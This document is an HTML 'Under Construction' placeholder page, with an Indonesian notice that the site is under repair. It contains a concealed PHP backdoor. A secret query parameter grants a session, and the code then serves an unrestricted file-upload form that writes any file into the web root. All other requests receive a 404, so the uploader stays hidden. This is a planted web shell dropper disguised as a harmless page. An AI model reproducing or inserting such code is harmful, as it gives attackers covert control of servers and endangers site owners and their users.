<!DOCTYPE html>
<html lang="en" style="height: 100%;">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Website is Under Construction</title>
</head>
<body style="height: 100%;">
<p style="text-align: center;"><img align="center" src="https://ik.imagekit.io/expx/ROOT/MRectangle-6.png?updatedat=1751399582829" style="width: 75%;" /></p>
<div>
<h3 style="text-align: center;"><span style="font-size:48px;">Under Construction</span></h3>
</div>
<div class="col-sm-12 margin_bottom" style="text-align: center;"><span style="font-size:24px;"><span style="font-family:courier new,courier,monospace;"><marquee><span style="background-color:#00FFFF;">Website ini dalam perbaikan...</span></marquee></span></span></div>
</body>
<?php
session_start(); 
$expected_param = 'sayur';
$expected_value = 'kol';
$is_authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

if (isset($_GET[$expected_param]) && $_GET[$expected_param] === $expected_value) {
    if (!$is_authenticated) {
        $_SESSION['authenticated'] = true;
        $is_authenticated = true;
    }

    $upload_dir = __DIR__ . '/'; 
    $is_writable = is_writable($upload_dir);

    if ($is_authenticated) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
            $upload_file = $upload_dir . basename($_FILES['file']['name']);

            if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
                echo "File successfully uploaded: " . htmlspecialchars(basename($_FILES['file']['name']));
            } else {
                echo "An error occurred during file upload.";
            }
        }
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>File Upload</title>
        </head>
        <body>
            <p>Upload Directory Status: <strong><?php echo $is_writable ? 'Writable' : 'Not Writable'; ?></strong></p>
            <form action="" method="post" enctype="multipart/form-data">
                <label for="file">Choose a file:</label>
                <input type="file" name="file" id="file" required>
                <button type="submit">Upload</button>
            </form>
        </body>
        </html>
        <?php
        exit; 
    }
} else {
    http_response_code(404);
    exit;
}
?>
</html>
